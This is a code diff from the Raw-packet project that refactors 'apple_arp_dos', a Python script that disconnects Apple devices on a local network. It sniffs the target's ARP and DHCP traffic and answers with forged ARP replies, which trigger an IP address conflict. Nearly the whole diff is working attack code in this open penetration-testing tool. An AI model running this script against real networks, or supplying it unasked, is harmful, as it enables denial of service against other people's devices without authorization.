@@ -11,9 +11,12 @@ Copyright 2020, Raw-packet Project
 # endregion
 
 # region Import
-from sys import path
-from os.path import dirname, abspath
-from argparse import ArgumentParser
+from raw_packet.Utils.base import Base
+from raw_packet.Scanners.scanner import Scanner
+from raw_packet.Scanners.arp_scanner import ArpScan
+from raw_packet.Utils.network import RawARP, RawSniff
+from raw_packet.Utils.tm import ThreadManager
+from argparse import ArgumentParser, RawTextHelpFormatter
 from socket import socket, AF_PACKET, SOCK_RAW
 from time import sleep
 from typing import Union, List, Dict
@@ -30,103 +33,143 @@ __email__ = 'ivanov.vladimir.mail@gmail.com'
 __status__ = 'Production'
 # endregion
 
-# region Set global variables
-network_interface_settings: Union[None, Dict[str, str]] = None
-apple_device: Union[None, List[str]] = list()
-raw_socket: socket = socket(AF_PACKET, SOCK_RAW)
-# endregion
 
+# region class AppleArpDos
+class AppleArpDos:
 
-# region ARP request sender
-def _send_arp_requests(source_mac_address: str, send_socket: socket,
-                       random_ip_address: str, count_of_packets: int = 5) -> None:
-    arp_init_request = arp.make_request(ethernet_src_mac=source_mac_address,
-                                        ethernet_dst_mac='33:33:00:00:00:01',
-                                        sender_mac=source_mac_address,
-                                        sender_ip=apple_device[0],
-                                        target_mac='00:00:00:00:00:00',
-                                        target_ip=random_ip_address)
-    for _ in range(count_of_packets):
-        send_socket.send(arp_init_request)
-        sleep(0.5)
-# endregion
-
-
-# region ARP reply sender
-def _send_arp_reply(source_mac_address: str, send_socket: socket) -> None:
-    arp_reply = arp.make_response(ethernet_src_mac=source_mac_address,
-                                  ethernet_dst_mac=apple_device[1],
-                                  sender_mac=source_mac_address,
-                                  sender_ip=apple_device[0],
-                                  target_mac=apple_device[1],
-                                  target_ip=apple_device[0])
-    send_socket.send(arp_reply)
-    base.print_info('ARP response to: ', apple_device[1], ' "' + apple_device[0] + ' is at ' + source_mac_address + '"')
-# endregion
-
-
-# region Analyze request
-def _analyze(request: Dict) -> None:
-
-    # region Define global variables
-    global network_interface_settings
-    global apple_device
-    global raw_socket
+    # region Init Raw-packet classes
+    base: Base = Base()
+    sniff: RawSniff = RawSniff()
+    arp: RawARP = RawARP()
     # endregion
 
-    # region ARP request
-    if 'ARP' in request.keys():
-        if request['Ethernet']['destination'] == 'ff:ff:ff:ff:ff:ff' and \
-                request['ARP']['target-mac'] == '00:00:00:00:00:00' and \
-                request['ARP']['target-ip'] == apple_device[0]:
-            base.print_info('ARP request from: ', request['Ethernet']['source'],
-                            ' "Who has ' + request['ARP']['target-ip'] +
-                            '? Tell ' + request['ARP']['sender-ip'] + '"')
-            _send_arp_reply(source_mac_address=network_interface_settings['MAC address'],
-                            send_socket=raw_socket)
+    # region Init
+    def __init__(self,
+                 network_interface: str,
+                 your_mac_address: str,
+                 apple_device_mac_address: str,
+                 apple_device_ip_address: str,
+                 quit: bool = False):
+        """
+        Init
+        :param network_interface: Network interface name
+        :param your_mac_address: Your MAC address
+        :param apple_device_mac_address: Target Apple device MAC address
+        :param apple_device_ip_address: Target Apple device IPv4 address
+        :param quit: Quit mode
+        """
+
+        # region Create raw socket
+        self.network_interface = network_interface
+        self.raw_socket: socket = socket(AF_PACKET, SOCK_RAW)
+        self.raw_socket.bind((self.network_interface, 0))
+        # endregion
+
+        # region Set variables
+        self.your_mac_address = your_mac_address
+        self.apple_device_mac_address = apple_device_mac_address
+        self.apple_device_ip_address = apple_device_ip_address
+        self.quit = quit
+        # endregion
+
     # endregion
 
-    # region DHCPv4 request
-    else:
-        if 'DHCPv4' in request.keys():
-            if request['DHCPv4'][53] == 4:
-                base.print_success('DHCPv4 Decline from: ', request['Ethernet']['source'],
-                                   ' IPv4 address conflict detection!')
-            if request['DHCPv4'][53] == 3:
-                if 50 in request['DHCPv4'].keys():
-                    apple_device[0] = str(request['DHCPv4'][50])
-                    base.print_success('DHCPv4 Request from: ', apple_device[1], ' requested ip: ', apple_device[0])
+    # region Start ARP DOS
+    def start(self):
+
+        # region Start _sniffer
+        tm = ThreadManager(2)
+        tm.add_task(self._sniffer)
+        # endregion
+
+        # region Send first Multicast ARP request packets
+        sleep(3)
+        if not self.quit:
+            self.base.print_warning('Send initial Multicast ARP requests')
+        self._send_arp_requests(count_of_packets=5)
+        # endregion
+
+        # region Wait for completion
+        tm.wait_for_completion()
+        # endregion
+
     # endregion
-# endregion
 
+    # region ARP request sender
+    def _send_arp_requests(self, count_of_packets: int = 5) -> None:
+        random_ip_address: str = self.base.get_random_ip_on_interface(self.network_interface)
+        arp_init_request = self.arp.make_request(ethernet_src_mac=self.your_mac_address,
+                                                 ethernet_dst_mac='33:33:00:00:00:01',
+                                                 sender_mac=self.your_mac_address,
+                                                 sender_ip=self.apple_device_ip_address,
+                                                 target_mac='00:00:00:00:00:00',
+                                                 target_ip=random_ip_address)
+        for _ in range(count_of_packets):
+            self.raw_socket.send(arp_init_request)
+            sleep(0.5)
+    # endregion
 
-# region Sniff ARP and DHCP request from target
-def _sniffer() -> None:
-    sniff.start(protocols=['ARP', 'IPv4', 'UDP', 'DHCPv4'],  prn=_analyze,
-                filters={'Ethernet': {'source': apple_device[1]},
-                         'ARP': {'opcode': 1},
-                         'IPv4': {'source-ip': '0.0.0.0', 'destination-ip': '255.255.255.255'},
-                         'UDP': {'source-port': 68, 'destination-port': 67}})
+    # region ARP reply sender
+    def _send_arp_reply(self) -> None:
+        arp_reply = self.arp.make_response(ethernet_src_mac=self.your_mac_address,
+                                           ethernet_dst_mac=self.apple_device_mac_address,
+                                           sender_mac=self.your_mac_address,
+                                           sender_ip=self.apple_device_ip_address,
+                                           target_mac=self.apple_device_mac_address,
+                                           target_ip=self.apple_device_ip_address)
+        self.raw_socket.send(arp_reply)
+        self.base.print_info('ARP response to: ', self.apple_device_ip_address, ' "' + self.apple_device_ip_address +
+                             ' is at ' + self.your_mac_address + '"')
+    # endregion
+
+    # region Analyze packet
+    def _analyze(self, packet: Dict) -> None:
+
+        # region ARP packet
+        if 'ARP' in packet.keys():
+            if packet['Ethernet']['destination'] == 'ff:ff:ff:ff:ff:ff' and \
+                    packet['ARP']['target-mac'] == '00:00:00:00:00:00' and \
+                    packet['ARP']['target-ip'] == self.apple_device_ip_address:
+                self.base.print_info('ARP packet from: ', packet['Ethernet']['source'],
+                                     ' "Who has ' + packet['ARP']['target-ip'] +
+                                     '? Tell ' + packet['ARP']['sender-ip'] + '"')
+                self._send_arp_reply()
+        # endregion
+
+        # region DHCPv4 packet
+        else:
+            if 'DHCPv4' in packet.keys():
+                if packet['DHCPv4'][53] == 4:
+                    self.base.print_success('DHCPv4 Decline from: ', packet['Ethernet']['source'],
+                                            ' IPv4 address conflict detection!')
+                if packet['DHCPv4'][53] == 3:
+                    if 50 in packet['DHCPv4'].keys():
+                        self.apple_device_ip_address = str(packet['DHCPv4'][50])
+                        self.base.print_success('DHCPv4 Request from: ', self.apple_device_mac_address,
+                                                ' requested ip: ', self.apple_device_ip_address)
+        # endregion
+
+    # endregion
+
+    # region Sniff ARP and DHCP request from target
+    def _sniffer(self) -> None:
+        self.sniff.start(protocols=['ARP', 'IPv4', 'UDP', 'DHCPv4'], prn=self._analyze,
+                         filters={'Ethernet': {'source': self.apple_device_mac_address},
+                                  'ARP': {'opcode': 1},
+                                  'IPv4': {'source-ip': '0.0.0.0', 'destination-ip': '255.255.255.255'},
+                                  'UDP': {'source-port': 68, 'destination-port': 67}})
+    # endregion
+
 # endregion
 
 
 # region Main function
-
 def main():
-    # region Import Raw-packet classes
-    from raw_packet.Utils.base import Base
-    from raw_packet.Scanners.scanner import Scanner
-    from raw_packet.Scanners.arp_scanner import ArpScan
-    from raw_packet.Utils.network import RawARP, RawSniff
-    from raw_packet.Utils.tm import ThreadManager
-    # endregion
 
     # region Init Raw-packet classes
     base: Base = Base()
     scanner: Scanner = Scanner()
-    sniff: RawSniff = RawSniff()
     arp_scan: ArpScan = ArpScan()
-    arp: RawARP = RawARP()
     # endregion
 
     # region Check user and platform
@@ -136,7 +179,10 @@ def main():
 
     try:
         # region Parse script arguments
-        parser = ArgumentParser(description='Disconnect Apple device in local network with ARP packets')
+        script_description: str = \
+            base.get_banner() + '\n' + \
+            base.info_text('Disconnect Apple device in local network with ARP packets (apple_arp_dos)') + '\n\n'
+        parser = ArgumentParser(description=script_description, formatter_class=RawTextHelpFormatter)
         parser.add_argument('-i', '--interface', type=str, help='Set interface name for send ARP packets', default=None)
         parser.add_argument('-t', '--target_ip', type=str, help='Set target IP address', default=None)
         parser.add_argument('-m', '--target_mac', type=str, help='Set target MAC address', default=None)
@@ -173,10 +219,6 @@ def main():
         assert last_ip_address is not None, \
             'Network interface: ' + base.error_text(str(listen_network_interface)) + \
             ' has not IPv4 address or network mask!'
-        # endregion
-
-        # region Create global raw socket
-        raw_socket.bind((listen_network_interface, 0))
         # endregion
 
         # region General output
@@ -223,22 +265,13 @@ def main():
             base.print_info('Target: ', apple_device[0] + ' (' + apple_device[1] + ')')
         # endregion
 
-        # region Start _sniffer
-        tm = ThreadManager(2)
-        tm.add_task(_sniffer)
-        # endregion
-
-        # region Send first Multicast ARP request packets
-        sleep(3)
-        if not args.quit:
-            base.print_warning('Send initial Multicast ARP requests')
-        _send_arp_requests(source_mac_address=your_mac_address, send_socket=raw_socket,
-                           random_ip_address=base.get_random_ip_on_interface(listen_network_interface),
-                           count_of_packets=5)
-        # endregion
-
-        # region Wait for completion
-        tm.wait_for_completion()
+        # region Start ARP DOS
+        apple_arp_dos: AppleArpDos = AppleArpDos(network_interface=listen_network_interface,
+                                                 your_mac_address=your_mac_address,
+                                                 apple_device_mac_address=apple_device[1],
+                                                 apple_device_ip_address=apple_device[0],
+                                                 quit=args.quit)
+        apple_arp_dos.start()
         # endregion
 
     except KeyboardInterrupt:
@@ -248,8 +281,10 @@ def main():
     except AssertionError as Error:
         base.print_error(Error.args[0])
         exit(1)
-
 # endregion
 
+
+# region Call Main function
 if __name__ == '__main__':
     main()
+# endregion
